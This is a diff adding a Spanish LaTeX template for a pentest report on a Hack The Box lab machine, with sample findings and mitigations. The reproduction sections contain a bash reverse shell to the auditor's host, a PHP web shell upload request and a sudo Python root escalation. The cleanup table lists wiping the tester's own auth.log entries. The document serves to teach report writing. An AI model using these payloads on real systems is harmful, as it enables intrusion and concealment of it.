@@ -1,0 +1,1131 @@
+% El proposito de esta plantilla es poder crear un reporte de las maquinas de HTB en LaTex
+% lo mas parecido posible a un reporte profesional. 
+% Mi intencion con esto es la de un ejercicio academico autodidacta y lo comparto por 
+% si alguien lo encuentra interesante o le es de utilidad, no es una plantilla oficial.
+% Recursos que utilicé:
+% https://labs.hackthebox.com/storage/press/samplereport/sample-penetration-testing-report-template.pdf
+% https://storage.googleapis.com/breathecode/pentesting-reports/3edd5b4f-sample-pentest-report-astra-pentest.pdf
+% https://storage.googleapis.com/breathecode/pentesting-reports/Sample-Penetration-Test-Report-PurpleSec.pdf
+% https://storage.googleapis.com/breathecode/pentesting-reports/EXAMPLE-Penetration_Testing_Report_v.1.0.pdf
+
+% =========================================================================
+% PLANTILLA DE REPORTE DE PENTESTING - HACK THE BOX
+% Autor: o1101ol
+% Descripción: Plantilla LaTeX para reportes profesionales de CTFs/Auditorías
+% =========================================================================
+
+\documentclass[a4paper]{article}
+
+% ==========================================
+% 1. PAQUETES Y CONFIGURACIÓN
+% ==========================================
+\usepackage[utf8]{inputenc}
+\usepackage[spanish]{babel}
+\usepackage{xurl}
+\usepackage[
+    left=2.5cm, 
+    right=2.5cm, 
+    top=2.5cm, 
+    bottom=4cm,    
+    footskip=2cm    
+]{geometry}
+\usepackage{graphicx}
+\usepackage[table]{xcolor}
+\usepackage[most]{tcolorbox}
+\usepackage{fancyhdr}
+\usepackage{tabularx}
+\usepackage{listings}
+\usepackage{smartdiagram}
+\usepackage{parskip}
+\usepackage{lastpage}
+\usepackage[hidelinks]{hyperref}
+\usepackage{bookmark}
+\usepackage{helvet}
+\usepackage{float}
+\usesmartdiagramlibrary{additions}
+\usepackage{booktabs}
+\usepackage{tikz}
+\usetikzlibrary{calc}
+% ==========================================
+% 2. DEFINICIÓN DE COLORES Y ESTILOS
+% ==========================================
+
+% Colores Base
+\definecolor{primaryDark}{HTML}{0D1117}
+\definecolor{textGray}{HTML}{586069}
+
+% Colores de Riesgo (CVSS/Matriz)
+\definecolor{riskCritical}{HTML}{E74C3C} % Rojo
+\definecolor{riskHigh}{HTML}{E67E22}     % Naranja
+\definecolor{riskMedium}{HTML}{F1C40F}   % Amarillo
+\definecolor{riskLow}{HTML}{27AE60}      % Verde
+\definecolor{riskInfo}{HTML}{3498DB}     % Azul
+
+% Colores para Bloques de Código
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+% Estilo de Listings (Bloques de Código)
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+% Por si usamos tildes o caracteres como ñ en los bloques de codigo
+\lstset{
+    style=mystyle,
+    extendedchars=true,
+    literate={á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1 {ñ}{{\~n}}1
+}
+% Definición de columnas para la tabla de serveridad
+\newcolumntype{Y}{>{\centering\arraybackslash}X}
+
+% Macro para Badges de Riesgo
+\newcommand{\riskbadge}[2]{
+    \begin{tcolorbox}[
+        colback=#1, 
+        colframe=#1, 
+        coltext=white, 
+        boxrule=0pt, 
+        arc=4pt, 
+        auto outer arc, 
+        boxsep=2pt,
+        left=4pt, right=4pt, top=2pt, bottom=2pt, 
+        width=2.4cm, 
+        halign=center, 
+        nobeforeafter, 
+        baseline=8pt
+    ]
+    \textbf{#2}
+    \end{tcolorbox}
+}
+
+% ==========================================
+% 3. VARIABLES GLOBALES DEL REPORTE
+% ==========================================
+
+% Ajustar estos valores para cada nueva máquina
+\newcommand{\empresa}{o1101ol Sec} % Nombre de la empresa ficticia que audita
+\newcommand{\miUser}{o1101ol} % Nombre del usuario que audita
+\newcommand{\cliente}{Cliente} % Cliente al que se le hace la auditoria
+\newcommand{\maquinaNombre}{MaquinaWeb} % Nombre de la maquina
+\newcommand{\maquinaID}{MAWB} % Id de la máquina para los detalles
+\newcommand{\maquinaIP}{10.10.11.245} % IP de la maquina
+\newcommand{\reporteID}{HTB-2025-001} % ID ficticio del reporte
+\newcommand{\versionRepo}{1.0} % Version del reporte
+\newcommand{\fecha}{\today} % Fecha de emsision del reporte
+
+% Rutas de Imágenes (Reemplazar los examples por la ruta ej. images/archivo.png)
+\newcommand{\logoHtb}{example-image-a}  % Logo de HTB
+\newcommand{\empresaLogo}{example-image-b} % Empresa ficticia
+\newcommand{\logoMaquina}{example-image-a} % Logo de la máquina
+
+% ==========================================
+% 4. CONFIGURACIÓN DE PÁGINA
+% ==========================================
+\setlength{\headheight}{40.2pt}
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\includegraphics[width=1cm]{\empresaLogo}}
+\rhead{\textcolor{textGray}{No imprimir ni compartir este documento}}
+\cfoot{
+    \small Página \thepage \hspace{1pt} de \pageref{LastPage}
+    \hspace{0.5cm} | \hspace{0.5cm}
+    \hyperref[sec:toc]{\textbf{Ir al índice}}
+    }
+
+\renewcommand{\familydefault}{\sfdefault} 
+\renewcommand{\arraystretch}{1.6} 
+\renewcommand{\headrulewidth}{0.5pt} 
+\renewcommand{\headrule}{\hbox to \headwidth{\color{textGray}\leaders\hrule height \headrulewidth\hfill}} 
+\renewcommand{\lstlistingname}{Evidencia} 
+
+% ==========================================
+% INICIO DEL DOCUMENTO
+% ==========================================
+\begin{document}
+
+% --- PORTADA ---
+\begin{titlepage}
+    \newgeometry{top=0cm, left=0cm, right=0cm, bottom=0cm}
+    
+    \begin{tcolorbox}[
+        enhanced,
+        colback=primaryDark,
+        colframe=primaryDark,   
+        arc=0mm,                
+        boxrule=0mm,            
+        width=\paperwidth,      
+        height=0.45\paperheight,
+        valign=center,          
+        halign=center,          
+        nobeforeafter           
+    ]
+        % --- CONTENIDO DEL BANNER ---
+        \vspace{1cm}
+        \includegraphics[height=2.5cm]{\logoHtb} 
+        \hfill 
+        \includegraphics[height=2.5cm]{\empresaLogo}
+        \vspace{1.5cm}
+
+        \textcolor{white}{
+            {\fontsize{50}{60}\selectfont \textbf{\maquinaNombre}} \\[0.5cm]
+            {\Large \textbf{IP:} \maquinaIP} \\[0.2cm]
+            {\small SISTEMA OPERATIVO: LINUX / WINDOWS}
+        }
+        
+        \vspace{1cm}
+
+        \begin{center}
+            \begin{tikzpicture}
+                \node[circle, fill=white, inner sep=5pt] {
+                    \includegraphics[width=3cm, height=3cm, keepaspectratio]{\logoMaquina}
+                };
+            \end{tikzpicture}
+        \end{center}
+
+    \end{tcolorbox}
+    
+    \vspace{2cm}
+    \begin{center}
+        \color{primaryDark}
+        
+        {\Huge \textbf{INFORME TÉCNICO DE}} \\[0.3cm]
+        {\Huge \textbf{PENETRATION TESTING}}
+        
+        \vspace{0.5cm}
+        \rule{0.6\textwidth}{1pt}
+        \vspace{1.5cm}
+        
+        \renewcommand{\arraystretch}{2}
+        \begin{tabular}{r l}
+            \textbf{CLASIFICACIÓN:} & Confidencial \\
+            \textbf{CLIENTE:} & \cliente \\
+            \textbf{AUDITOR:} & \miUser \\
+            \textbf{FECHA:} & \fecha \\
+            \textbf{VERSIÓN:} & \versionRepo \\
+        \end{tabular}
+
+    \end{center}
+
+    \restoregeometry
+\end{titlepage}
+
+% --- ÍNDICE ---
+\clearpage
+{
+  \hypersetup{linkcolor=black}
+  \phantomsection
+  \label{sec:toc}
+  \tableofcontents
+}
+\clearpage
+
+% --- CONTROL DE VERSIONES ---
+\section*{Control de Versiones}
+\begin{table}[h]
+    \centering
+    \rowcolors{2}{white}{gray!10}
+    \begin{tabularx}{\textwidth}{l l l X}
+        \rowcolor{primaryDark}\textcolor{white}{\textbf{Versión}} & 
+        \textcolor{white}{\textbf{Fecha}} & 
+        \textcolor{white}{\textbf{Autor}} & 
+        \textcolor{white}{\textbf{Comentarios}} \\
+
+        0.1 & 
+        18/12/2025 & 
+        \miUser & 
+        Borrador inicial y escaneo automatizado. \\
+
+        0.5 & 
+        19/12/2025 & 
+        \miUser & 
+        Validación de hallazgos y explotación (PoC). \\
+
+        1.0 & 
+        \fecha & 
+        \miUser & 
+        Versión final para entrega al cliente. \\
+    \end{tabularx}
+\end{table}
+\clearpage
+
+% ==========================================
+% SECCIÓN 1: RESUMEN EJECUTIVO
+% ==========================================
+\section*{Resumen Ejecutivo}
+\label{sec:resumen}
+\addcontentsline{toc}{section}{Resumen Ejecutivo}
+
+Se ha realizado una evaluación de seguridad técnica (Pentest) sobre el activo \textbf{\maquinaNombre} alojado en la plataforma Hack The Box. Esta evaluación simula un escenario de ataque de caja negra (Black Box) para identificar vectores de compromiso en la infraestructura expuesta.
+
+\subsection*{Clasificación de Riesgos}
+\addcontentsline{toc}{subsection}{Clasificación de Riesgos}
+Este informe utiliza el estándar \textbf{CVSS v3.1}. La siguiente matriz define los criterios de severidad y tiempos de respuesta sugeridos (SLA).
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{c c X} 
+        \toprule
+        \textbf{Severidad} & 
+        \textbf{CVSS v3.1 Score} & 
+        \textbf{Definición y SLA} \\ 
+        \midrule
+
+        \riskbadge{riskCritical}{CRÍTICO} & 
+        9.0 -- 10.0 & 
+        \textbf{Emergencia Inmediata.} Compromiso total del sistema. \par
+        \vspace{0.1cm} 
+        \small{\textcolor{textGray}{\textit{\textbf{SLA:} 24-48 horas.}}} \\ 
+        \addlinespace[0.4cm]
+        
+        \riskbadge{riskHigh}{ALTO} & 
+        7.0 -- 8.9 & 
+        \textbf{Riesgo Significativo.} Compromiso de confidencialidad. \par
+        \vspace{0.1cm}
+        \small{\textcolor{textGray}{\textit{\textbf{SLA:} Próximo ciclo de parches.}}} \\ 
+        \addlinespace[0.4cm]
+        
+        \riskbadge{riskMedium}{MEDIO} & 
+        4.0 -- 6.9 & 
+        \textbf{Riesgo Moderado.} Requiere condiciones específicas. \par
+        \vspace{0.1cm}
+        \small{\textcolor{textGray}{\textit{\textbf{SLA:} Mantenimiento estándar.}}} \\ 
+        \addlinespace[0.4cm]
+        
+        \riskbadge{riskLow}{BAJO} & 
+        1.0 -- 3.9 & 
+        \textbf{Riesgo Menor.} Impacto reducido o alta complejidad. \par
+        \vspace{0.1cm}
+        \small{\textcolor{textGray}{\textit{\textbf{Recomendación:} Monitorizar.}}} \\ 
+        \addlinespace[0.4cm]
+        
+        \riskbadge{riskInfo}{INFO} & 
+        0.0 & 
+        \textbf{Mejores Prácticas.} Endurecimiento preventivo. \par
+        \vspace{0.1cm}
+        \small{\textcolor{textGray}{\textit{Sin acción requerida inmediata.}}} \\ 
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Matriz de criterios de severidad CVSS v3.1}
+\end{table}
+
+\subsection*{Resumen de la Evaluación}
+\addcontentsline{toc}{subsection}{Resumen de la Evaluación}
+Se identificaron un total de \textbf{2 vulnerabilidades significativas} que permitieron el compromiso total del sistema.
+
+\begin{table}[H]
+    \centering
+    \setlength{\tabcolsep}{12pt}
+    \begin{tabularx}{\textwidth}{c Y Y Y Y Y} 
+        \toprule
+        \textbf{Severidad} & 
+        \textbf{Resuelto} & 
+        \textbf{Sin resolver} & 
+        \textbf{En revisión} & 
+        \textbf{Riesgo Aceptado} & 
+        \textbf{Total} \\ 
+        \midrule
+
+        \cellcolor{riskCritical}\textcolor{white}{\textbf{Crítico}} & 
+        0 & 1 & 0 & 0 & \textbf{1} \\ 
+        \addlinespace[0.2cm]
+
+        \cellcolor{riskHigh}\textcolor{white}{\textbf{Alto}} & 
+        0 & 1 & 0 & 0 & \textbf{1} \\ 
+        \addlinespace[0.2cm]
+
+        \cellcolor{riskMedium}\textcolor{white}{\textbf{Medio}} & 
+        0 & 0 & 1 & 0 & \textbf{1} \\ 
+        \addlinespace[0.2cm]
+        
+        \cellcolor{riskLow}\textcolor{white}{\textbf{Bajo}} & 
+        0 & 0 & 0 & 1 & \textbf{1} \\ 
+        \addlinespace[0.2cm]
+
+        \cellcolor{riskInfo}\textcolor{white}{\textbf{Info}} & 
+        0 & 0 & 1 & 0 & \textbf{1} \\ 
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Resumen de vulnerabilidades encontradas}
+\end{table}
+
+\subsection*{Impacto}
+\addcontentsline{toc}{subsection}{Impacto}
+La explotación exitosa permitió obtener acceso administrativo (`root`). Riesgos asociados:
+\begin{itemize}
+    \item \textbf{Exfiltración de Datos:} Acceso no autorizado a bases de datos.
+    \item \textbf{Interrupción del Servicio:} Capacidad para detener servicios críticos.
+    \item \textbf{Daño Reputacional:} Pérdida de confianza y posibles sanciones legales.
+\end{itemize}
+
+\subsection*{Conclusiones y Siguientes Pasos}
+La postura de seguridad del activo \textbf{\maquinaNombre} es deficiente. Las vulnerabilidades detectadas son de baja complejidad para un atacante pero de impacto catastrófico para la organización. 
+
+Se recomienda encarecidamente a la gerencia priorizar la remediación inmediata de los hallazgos Críticos y Altos detallados en la \textbf{seccion \ref{sec:acciones}}, comenzando por la restricción de la subida de archivos y la corrección de privilegios.
+
+\clearpage
+
+% ==========================================
+% SECCIÓN 2: ANÁLISIS TÉCNICO
+% ==========================================
+\section{Análisis Técnico de la Intrusión}
+\label{sec:analisis}
+\subsection{Alcance del Proyecto (Scope)}
+El alcance se definió estrictamente sobre el/los siguiente(s) activo(s):
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{l l X} 
+        \toprule
+        \textbf{Dirección IP / Rango} & 
+        \textbf{Hostname} & 
+        \textbf{Descripción / Rol} \\ 
+        \midrule
+        
+        10.10.11.245 & 
+        \path{legacyweb.htb} & 
+        Servidor Web Principal (Objetivo Primario) \\
+        
+        10.10.11.246 & 
+        \path{db-internal} & 
+        Base de datos (Pivotaje permitido) \\
+        
+        10.10.11.0/24 & 
+        N/A & 
+        Escaneo de red interna permitido \\
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Activos dentro del alcance (In-Scope)}
+    \label{tab:scope}
+\end{table}
+
+\subsection{Exclusiones (Out-of-Scope)}
+Los siguientes elementos fueron explícitamente excluidos de las pruebas para garantizar la continuidad del negocio o por restricciones del cliente:
+
+\begin{itemize}
+    \item Ataques de Denegación de Servicio (DoS/DDoS) contra cualquier activo.
+    \item Ingeniería Social dirigida a empleados de la organización.
+    \item El servidor \path{10.10.11.1} (Gateway de la infraestructura).
+\end{itemize}
+
+\subsection{Metodología Usada}
+Se siguieron las fases del estándar \textbf{PTES} y la metodología\textbf{OWASP}:
+
+\vspace{0.3cm}
+\begin{figure}[H]
+    \centering
+    \smartdiagramset{
+        back arrow disabled=true,
+        module minimum width=3cm,
+        module minimum height=1cm,
+        text width=2.5cm,
+        arrow tip=stealth,
+        arrow line width=2pt
+    }
+    \smartdiagram[flow diagram:vertical]{
+        Recopilación de Inteligencia,
+        Modelado de Amenazas,
+        Análisis de Vulnerabilidades,
+        Explotación,
+        Post-Explotación,
+        Reporte Final
+    }
+    \caption{Flujo de trabajo de la auditoría}
+\end{figure}
+
+\subsection{Resumen del Compromiso} 
+\begin{enumerate}
+    \item \textbf{Descubrimiento de la superficie de ataque:} 
+    El proceso comenzó con una enumeración exhaustiva del servicio web HTTP. Mediante técnicas de \textit{fuzzing} de directorios, se identificó un recurso oculto en la ruta \path{/contact.php} que no estaba enlazado visiblemente en la página principal, revelando un formulario funcional para el envío de información y archivos adjuntos.
+
+    \item \textbf{Identificación de vulnerabilidad de carga de archivos:} 
+    Al analizar el comportamiento del formulario, se detectó que el mecanismo de subida de archivos carecía de validaciones de seguridad robustas en el servidor. El sistema confiaba en filtros superficiales que podían ser evadidos, permitiendo la subida de archivos con extensiones ejecutables (PHP) en lugar de restringirse únicamente a imágenes o documentos seguros.
+
+    \item \textbf{Obtención de acceso inicial:} 
+    Aprovechando la vulnerabilidad anterior, se subió un script malicioso (\textit{Web Shell}) al servidor. Al navegar hacia la ubicación del archivo subido, el servidor web interpretó y ejecutó el código inyectado. Esto permitió establecer una conexión remota inversa hacia la máquina del auditor, otorgando acceso a la línea de comandos bajo el contexto del usuario de servicio \path{www-data}.
+
+    \item \textbf{Enumeración de privilegios locales:} 
+    Una vez dentro del sistema, se realizó una auditoría de la configuración interna para buscar vías de escalada. La revisión de los permisos de \path{sudo} reveló que el usuario \path{www-data} tenía una configuración insegura: se le permitía ejecutar el binario del lenguaje de programación Python con privilegios de administrador (\path{root}) sin necesidad de ingresar contraseña.
+
+    \item \textbf{Escalada de privilegios y compromiso total:} 
+    Finalmente, se explotó esta configuración incorrecta ejecutando un comando específico de Python diseñado para invocar una nueva consola del sistema (\path{/bin/bash}). Dado que Python se ejecutó con permisos elevados gracias a \path{sudo}, la nueva consola heredó los privilegios de \path{root}, logrando así el control absoluto sobre el sistema operativo y sus datos.
+\end{enumerate}
+
+\subsection{Reproducción Detallada}
+
+\subsubsection*{Fase 1: Acceso Inicial}
+Enumeración de directorios:
+\begin{lstlisting}[language=bash, caption=Descubrimiento del endpoint]
+gobuster dir -u http://10.10.11.245 -w common.txt -x php
+# Resultado: /contact.php (Status: 200)
+\end{lstlisting}
+
+Bypass de subida de archivos interceptando la petición:
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.5\textwidth]{example-image-c}
+    \caption{Bypass de restricción de subida}
+\end{figure}
+
+Ejecución de Reverse Shell:
+\begin{lstlisting}[language=bash, caption=Payload de conexión]
+http://10.10.11.245/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.x/443 0>&1'
+\end{lstlisting}
+
+\subsubsection*{Fase 2: Escalada de Privilegios}
+Enumeración de permisos sudo:
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.5\textwidth]{example-image-c}
+    \caption{Identificación de vector de escalada}
+\end{figure}
+
+Explotación final:
+\begin{lstlisting}[language=bash, caption=Obtención de root]
+www-data@host:/$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+root@host:/# id
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
+
+\clearpage
+
+% ==========================================
+% SECCIÓN 3: DETALLE DE HALLAZGOS
+% ==========================================
+\section{Detalles de los Hallazgos}
+\label{sec:detalles}
+% --- HALLAZGO CRITICO ---
+\subsection{Hallazgo VULN-\maquinaID-01: Carga de Archivos Sin Restricciones}
+
+\begin{tcolorbox}[colback=white, colframe=riskCritical, title=\textbf{Hallazgo VULN-\maquinaID-01: Carga de Archivos Sin Restricciones}]
+    \begin{tabularx}{\textwidth}{lX}
+
+        \textbf{Severidad:} &
+        \textcolor{riskCritical}{\textbf{CRITICA (9.8)}} \\
+        
+        \textbf{CWE:} & 
+        CWE-434 (Unrestricted Upload of File with Dangerous Type) \\
+        
+        \textbf{MITRE ATT\&CK:} & 
+        \textbf{T1190} (Exploit Public-Facing Application) \\
+        
+        \textbf{CVSS:} & 
+        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \\
+    
+    \end{tabularx}
+\end{tcolorbox}
+
+\subsection*{Descripcion General}
+La aplicacion web permite a usuarios no autenticados subir archivos al servidor a traves del endpoint \path{/contact.php}. No existen controles adecuados para validar el tipo de contenido (MIME Type) ni la extension del archivo. Esto permite subir scripts maliciosos (webshells) que pueden ser ejecutados por el servidor web.
+
+\subsection*{Evidencia}
+A continuacion se muestra la peticion HTTP interceptada donde se sube el archivo \path{exploit.php} eludiendo validaciones del lado del cliente:
+
+\begin{lstlisting}[language=bash, caption=Peticion HTTP Maliciosa para subir Web Shell]
+POST /contact.php HTTP/1.1
+Host: 10.10.11.245
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+\end{lstlisting}
+
+\subsection*{Recomendacion de Mitigacion}
+\begin{itemize}
+    \item Validar estrictamente las extensiones de archivo permitidas mediante una lista blanca (ej: solo .jpg, .png).
+    \item Almacenar los archivos subidos fuera del directorio raiz del servidor web para evitar su ejecucion.
+    \item Renombrar los archivos subidos para evitar colisiones o nombres maliciosos.
+\end{itemize}
+
+\clearpage
+
+% --- HALLAZGO ALTO ---
+\subsection{Hallazgo VULN-\maquinaID-02: Configuracion Insegura de Sudo}
+
+\begin{tcolorbox}[colback=white, colframe=riskHigh, title=\textbf{Hallazgo VULN-\maquinaID-02: Configuracion Insegura de Sudo}]
+    \begin{tabularx}{\textwidth}{lX}
+
+        \textbf{Severidad:} & 
+        \textcolor{riskHigh}{\textbf{ALTA (7.8)}} \\
+
+        \textbf{CWE:} & 
+        CWE-269 (Improper Privilege Management) \\
+
+        \textbf{MITRE ATT\&CK:} & 
+        \textbf{T1548.003} (Abuse Elevation Control Mechanism: Sudo) \\
+
+        \textbf{CVSS:} & 
+        AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H \\
+
+    \end{tabularx}
+\end{tcolorbox}
+
+\subsection*{Descripcion General}
+El usuario del servicio web (\path{www-data}) tiene permisos configurados explícitamente en el archivo \path{/etc/sudoers} para ejecutar el binario de Python como superusuario (`root`) sin necesidad de ingresar una contraseña. Esto permite una escalada de privilegios vertical inmediata.
+
+\subsection*{Evidencia}
+Salida del comando de verificacion de privilegios sudo, mostrando la directiva \path{NOPASSWD}:
+
+\begin{lstlisting}[language=bash, caption=Verificacion de permisos sudo]
+www-data@legacyweb:/$ sudo -l
+Matching Defaults entries for www-data on legacyweb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+User www-data may run the following commands on legacyweb:
+    (ALL) NOPASSWD: /usr/bin/python3
+\end{lstlisting}
+
+\subsection*{Recomendacion de Mitigacion}
+\begin{itemize}
+    \item Eliminar la entrada correspondiente en el archivo \path{/etc/sudoers} que otorga permisos al usuario \path{www-data}.
+    \item Aplicar el Principio de Minimo Privilegio: los usuarios de servicio no deberian tener capacidad de elevar privilegios a root.
+\end{itemize}
+
+\clearpage
+
+% --- HALLAZGO MEDIO ---
+\subsection{Hallazgo VULN-\maquinaID-03: Ausencia de Protección Anti-CSRF}
+
+\begin{tcolorbox}[colback=white, colframe=riskMedium, title=\textbf{Hallazgo VULN-\maquinaID-03: Ausencia de Protección Anti-CSRF}]
+    \begin{tabularx}{\textwidth}{lX}
+
+        \textbf{Severidad:} & 
+        \textcolor{riskMedium}{\textbf{MEDIO (4.3)}} \\
+
+        \textbf{CWE:} & 
+        CWE-352 (Cross-Site Request Forgery) \\
+
+        \textbf{MITRE ATT\&CK:} & 
+        \textbf{T1204.001} (User Execution: Malicious Link) \\
+
+        \textbf{CVSS:} & 
+        AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N \\
+    \end{tabularx}
+\end{tcolorbox}
+
+\subsection*{Descripción General}
+El formulario de contacto en \path{/contact.php} no implementa tokens anti-CSRF (Cross-Site Request Forgery). Esto permitiría a un atacante forzar a un usuario autenticado (si lo hubiera) a enviar mensajes o realizar acciones en el formulario sin su consentimiento si visitan una página maliciosa controlada por el atacante.
+
+\subsection*{Evidencia}
+Al analizar el código fuente del formulario HTML, se observa la ausencia de un campo oculto (\path{hidden input}) con un token aleatorio de validación:
+
+\begin{lstlisting}[language=html, caption=Código fuente del formulario sin token CSRF]
+<form action="/contact.php" method="POST" enctype="multipart/form-data">
+    <label>Name:</label> <input type="text" name="name">
+    <label>File:</label> <input type="file" name="file">
+    <input type="submit" value="Send">
+</form>
+\end{lstlisting}
+
+\subsection*{Recomendación de Mitigación}
+\begin{itemize}
+    \item Implementar tokens únicos e impredecibles (Anti-CSRF Tokens) en todos los formularios que realicen cambios de estado o envíos de datos.
+    \item Verificar la cabecera \path{Origin} y \path{Referer} en el lado del servidor.
+\end{itemize}
+
+\clearpage
+
+% --- HALLAZGO BAJO ---
+\subsection{Hallazgo VULN-\maquinaID-04: Divulgación de Versión del Servidor}
+
+\begin{tcolorbox}[colback=white, colframe=riskLow, title=\textbf{Hallazgo VULN-\maquinaID-04: Divulgación de Versión del Servidor}]
+    \begin{tabularx}{\textwidth}{lX}
+
+        \textbf{Severidad:} & 
+        \textcolor{riskLow}{\textbf{BAJO (3.5)}} \\
+
+        \textbf{CWE:} & 
+        CWE-200 (Exposure of Sensitive Information) \\
+
+        \textbf{MITRE ATT\&CK:} & 
+        \textbf{T1592.002} (Gather Victim Host Information: Software) \\
+
+        \textbf{CVSS:} & 
+        AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N \\
+    \end{tabularx}
+\end{tcolorbox}
+
+\subsection*{Descripción General}
+El servidor web está configurado para exponer su nombre y versión exacta en las cabeceras de respuesta HTTP (\path{Server} Header). Esta información facilita a los atacantes la búsqueda de vulnerabilidades específicas (CVEs) asociadas a esa versión concreta del software.
+
+\subsection*{Evidencia}
+Respuesta HTTP capturada con \path{curl} o \path{Burp Suite}:
+
+\begin{lstlisting}[language=bash, caption=Cabecera Server expuesta]
+HTTP/1.1 200 OK
+Date: Fri, 19 Dec 2025 10:00:00 GMT
+Server: Apache/2.4.41 (Ubuntu)  <-- Version expuesta
+Content-Type: text/html; charset=UTF-8
+\end{lstlisting}
+
+\subsection*{Recomendación de Mitigación}
+\begin{itemize}
+    \item Configurar la directiva \path{ServerTokens Prod} y \path{ServerSignature Off} en el archivo de configuración de Apache (o equivalente en Nginx/IIS) para ocultar la versión detallada.
+\end{itemize}
+
+\clearpage
+
+% --- HALLAZGO INFO ---
+\subsection{Hallazgo VULN-\maquinaID-05: Cookies sin Flag HttpOnly}
+
+\begin{tcolorbox}[colback=white, colframe=riskInfo, title=\textbf{Hallazgo VULN-\maquinaID-05: Cookies sin Flag HttpOnly}]
+    \begin{tabularx}{\textwidth}{lX}
+
+        \textbf{Severidad:} & 
+        \textcolor{riskInfo}{\textbf{INFO (0.0)}} \\
+
+        \textbf{CWE:} & 
+        CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag) \\
+
+        \textbf{MITRE ATT\&CK:} &
+        \textbf{T1539} (Steal Web Session Cookie) \\
+
+        \textbf{CVSS:} & 
+        N/A (Buenas prácticas) \\
+
+    \end{tabularx}
+\end{tcolorbox}
+
+\subsection*{Descripción General}
+La cookie de sesión \path{PHPSESSID} generada por la aplicación no tiene configurado el atributo \path{HttpOnly}. Aunque actualmente no se detectaron scripts maliciosos almacenados, esta configuración permitiría que, ante un futuro ataque de XSS, la cookie pudiera ser accedida y robada mediante JavaScript (\path{document.cookie}).
+
+\subsection*{Evidencia}
+\begin{lstlisting}[language=bash, caption=Cabecera Set-Cookie insegura]
+Set-Cookie: PHPSESSID=a1b2c3d4e5f6...; path=/
+# Deberia ser:
+# Set-Cookie: PHPSESSID=...; path=/; HttpOnly; Secure
+\end{lstlisting}
+
+\subsection*{Recomendación de Mitigación}
+\begin{itemize}
+    \item Configurar el servidor o la aplicación (en \path{php.ini}: \path{session.cookie_httponly = 1}) para añadir el flag \path{HttpOnly} a todas las cookies de sesión.
+\end{itemize}
+
+\clearpage
+
+% ==========================================
+% SECCIÓN 4: LIMPIEZA
+% ==========================================
+\section{Limpieza del sistema y restauración (House Cleaning)}
+\label{sec:limpieza}
+Una vez finalizadas las pruebas de penetración, se procedió a eliminar todos los recursos generados, herramientas transferidas y usuarios creados temporalmente para garantizar que el sistema retorne a su estado original y no queden brechas de seguridad residuales.
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{l X l c} 
+        \toprule
+        \textbf{Tipo} & 
+        \textbf{Recurso / Ubicación} & 
+        \textbf{Acción} & 
+        \textbf{Estado} \\
+        \midrule
+
+        Archivo & 
+        \path{/tmp/linpeas.sh} & 
+        Eliminado & 
+        OK \\
+
+        Archivo & 
+        \path{C:\Windows\Temp\nc.exe} & 
+        Eliminado & 
+        OK \\
+
+        Web Shell & 
+        \path{/var/www/html/imagenes/cmd.php} & 
+        Eliminado & 
+        OK \\
+
+        Usuario & 
+        Usuario local \path{hacker_test} &
+        Borrado & 
+        OK \\
+
+        Persistencia & 
+        Tarea programada (Cron Job) maliciosa & 
+        Removida & 
+        OK \\
+
+        Log & 
+        \path{/var/log/auth.log} (Entradas propias) & 
+        Limpiado & 
+        OK \\
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Registro de actividades de limpieza y restauración del sistema}
+    \label{tab:cleanup}
+\end{table}
+
+\clearpage
+
+% ==========================================
+% SECCIÓN 5: ACCIONES RECOMENDADAS
+% ==========================================
+\section{Acciones Recomendadas}
+\label{sec:acciones}
+
+Basado en los hallazgos de esta evaluación, se proponen las siguientes acciones correctivas divididas por horizonte temporal. El objetivo no es solo corregir las vulnerabilidades detectadas, sino elevar el nivel de madurez de seguridad de la infraestructura.
+
+\subsection{Acciones Inmediatas}
+\textit{Estas acciones deben implementarse en un plazo no mayor a 48 horas debido al alto riesgo de compromiso activo.}
+
+\begin{itemize}
+    \item \textbf{Remediación de Carga de Archivos (VULN-\maquinaID-01):} 
+    Modificar el script \path{contact.php} para implementar una validación estricta de tipos MIME y extensiones (Lista Blanca: solo \path{.jpg}, \path{.png}, \path{.pdf}). Deshabilitar la ejecución de scripts en el directorio de subidas mediante configuraciones del servidor web (ej: \path{.htaccess} o configuración de Nginx).
+    
+    \item \textbf{Endurecimiento de Privilegios (VULN-\maquinaID-02):} 
